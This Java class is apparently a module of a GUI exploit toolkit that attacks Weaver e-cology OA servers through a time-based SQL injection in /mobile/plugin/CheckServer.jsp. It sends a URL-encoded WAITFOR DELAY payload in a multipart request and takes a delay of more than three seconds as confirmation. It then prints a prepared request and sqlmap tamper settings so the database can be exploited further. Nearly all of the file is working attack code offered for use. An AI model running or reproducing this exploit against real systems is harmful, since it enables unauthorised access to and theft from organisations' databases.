package exp.oa.weaveroa.ecology;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.HttpTools_getTime;
import utils.Response;

import java.util.HashMap;

public class weaver_ec_CheckServer_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK");
            String data = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"settings\"\r\n" +
                    "\r\n" +
                    "[{\"scope\":\"1\",\"module\":\"2\",\"setting\":\"@%31%27%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%33%27%20%20%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%4d%6f%62%69%6c%65%44%6f%63%53%65%74%74%69%6e%67%20%77%68%65%72%65%20%6e%61%6d%65%3d%27%52%34%67|1\",\"modulename\":\"test111\",\"include\":\"1\",\"orasc\":\"1\"}]\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"type\"\r\n" +
                    "\r\n" +
                    "mobileSetting\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                    "Content-Disposition: form-data; name=\"timestamp\"\r\n" +
                    "\r\n" +
                    "1\r\n" +
                    "------WebKitFormBoundarymVk33liI64J7GQaK";
            long var  = HttpTools_getTime.post(url + "/mobile/plugin/CheckServer.jsp?type=mobileSetting" ,data,head, "utf-8");
            if (var>3000) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ weaver_ec_CheckServer_sqli ]");
                    textArea.appendText("\n 将weaver_ec_checkserver_tamper.py文件放入tamper模块下");
                    textArea.appendText("\n 复制文本内容为target.req文件，并利用sqlmap模块进行利用");
                    textArea.appendText("\n");
                });

                String target_req = "POST /mobile/plugin/CheckServer.jsp HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0\n" +
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n" +
                        "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "Connection: close\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK\n" +
                        "Content-Length: 857\n" +
                        "\n" +
                        "\n" +
                        "------WebKitFormBoundarymVk33liI64J7GQaK\n" +
                        "Content-Disposition: form-data; name=\"settings\"\n" +
                        "\n" +
                        "------WebKitFormBoundarymVk33liI64J7GQaK\n" +
                        "Content-Disposition: form-data; name=\"type\"\n" +
                        "\n" +
                        "mobileSetting\n" +
                        "------WebKitFormBoundarymVk33liI64J7GQaK\n" +
                        "Content-Disposition: form-data; name=\"timestamp\"\n" +
                        "\n" +
                        "1\n" +
                        "------WebKitFormBoundarymVk33liI64J7GQaK";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "sqlmap:\n--tamper \"weaver_ec_checkserver_tamper.py\" --dbms \"Microsoft SQL Server\" --technique \"T\" -level 5\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                                    "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n"
                            );
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！\n");
            });
        }
        return false;
    }
}
